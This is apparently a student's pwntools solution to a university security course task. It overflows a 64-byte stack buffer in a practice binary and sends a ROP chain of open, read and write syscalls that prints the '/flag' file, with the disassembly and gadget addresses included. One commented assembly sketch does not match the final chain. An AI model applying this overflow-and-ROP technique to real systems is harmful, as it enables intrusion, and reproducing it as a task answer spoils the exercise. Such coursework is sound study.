import pwn
import time

# Feedback: I really liked this task and was able to solve it in roughly 2 hours. Eventhough looking back the task was quiet straight forward i struggled with python and pwntools. In general i would say that this task has a good scope for an exam task :)

# python3 -m venv pwn_env
# source pwn_env/bin/activate
# pip install --upgrade pip
# pip install pwntools

#pwn.context.arch = 'amd64'

# docker compose -f debug.yml up
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-2')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 33258)
#conn = pwn.remote('127.0.0.1', 1024)

# we read up to 65k bytes into 64-byte buffer
# write 64 bytes padding, then override base pointer and return address
# jump to where we want :)
# we write a ropchain onto the stack

# use ropper: ropper --file ./vuln
# use objdump: objdump -M intel -D ./vuln

"""
Disassembly of section .text:

0000000000401000 <mov_rdi_rax_ret>:
  401000:	48 89 c7             	mov    rdi,rax
  401003:	c3                   	ret    

0000000000401004 <pop_rdi_ret>:
  401004:	5f                   	pop    rdi
  401005:	c3                   	ret    

0000000000401006 <do_syscall>:
  401006:	0f 05                	syscall 
  401008:	c3                   	ret    

0000000000401009 <pop_rax_ret>:
  401009:	58                   	pop    rax
  40100a:	c3                   	ret    

000000000040100b <pop_rsi_ret>:
  40100b:	5e                   	pop    rsi
  40100c:	c3                   	ret    

000000000040100d <pop_rdx_ret>:
  40100d:	5a                   	pop    rdx
  40100e:	c3                   	ret    

000000000040100f <_start>:
  40100f:	e8 0c 00 00 00       	call   401020 <read_input>
  401014:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  40101b:	48 31 ff             	xor    rdi,rdi
  40101e:	0f 05                	syscall 

0000000000401020 <read_input>:
  401020:	55                   	push   rbp
  401021:	48 89 e5             	mov    rbp,rsp
  401024:	48 83 ec 40          	sub    rsp,0x40
  401028:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  40102f:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  401036:	48 8d 75 c0          	lea    rsi,[rbp-0x40]
  40103a:	48 c7 c2 ff ff 00 00 	mov    rdx,0xffff
  401041:	0f 05                	syscall 
  401043:	c9                   	leave  
  401044:	c3                   	ret    

Disassembly of section .data:

0000000000402000 <flag_file>:
  402000:	2f                   	(bad)  
  402001:	66 6c                	data16 ins BYTE PTR es:[rdi],dx
  402003:	61                   	(bad)  
  402004:	67 00 00             	add    BYTE PTR [eax],al


0000000000402008 <flag_buffer>:
"""

# read flag:
"""
mov rax, 2; // syscall number for open
mov rdi, 0x402000; pointer to "/flag"
mov rsi, 0; // readonly
syscall

mov rdi, 1;
mov rsi, rax;
mov rdx, 0;
mov r10, 100;
mov rax, 40;
syscall

"""

address_pop_rax_ret = 0x0000000000401009
address_pop_rdi_ret = 0x0000000000401004
address_pop_rsi_ret = 0x000000000040100b
address_syscall_ret = 0x0000000000401006
address_rdi_rax_ret = 0x0000000000401000
address_pop_rdx_ret = 0x000000000040100d

# 1) open file (sycall 2)
# 2) write file into buffer (syscall 0)
# 3) write file to stdout

# we ignore base pointer and use stack pointer only
ropchain = [
  # padding
  b'A'*64,
  b'B'*8,
  # open file /flag
  pwn.p64(address_pop_rax_ret),
  pwn.p64(2),
  pwn.p64(address_pop_rdi_ret),
  pwn.p64(0x402000),
  pwn.p64(address_pop_rsi_ret),
  pwn.p64(0),
  pwn.p64(address_syscall_ret),

  # read content of file into flag buffer
  pwn.p64(address_rdi_rax_ret),
  pwn.p64(address_pop_rax_ret),
  pwn.p64(0),
  pwn.p64(address_pop_rsi_ret),
  pwn.p64(0x0000000000402008), # the flag buffer
  pwn.p64(address_pop_rdx_ret),
  pwn.p64(100),
  pwn.p64(address_syscall_ret),

  # write flag buffer to output
  pwn.p64(address_pop_rax_ret),
  pwn.p64(1),
  pwn.p64(address_pop_rdi_ret),
  pwn.p64(1),
  pwn.p64(address_pop_rsi_ret),
  pwn.p64(0x0000000000402008), # the flag buffer
  pwn.p64(address_pop_rdx_ret),
  pwn.p64(100),
  pwn.p64(address_syscall_ret)
]

#time.sleep(5)

payload = b''.join(gadget for gadget in ropchain)

print(payload.hex())

conn.sendline(payload)

conn.interactive()
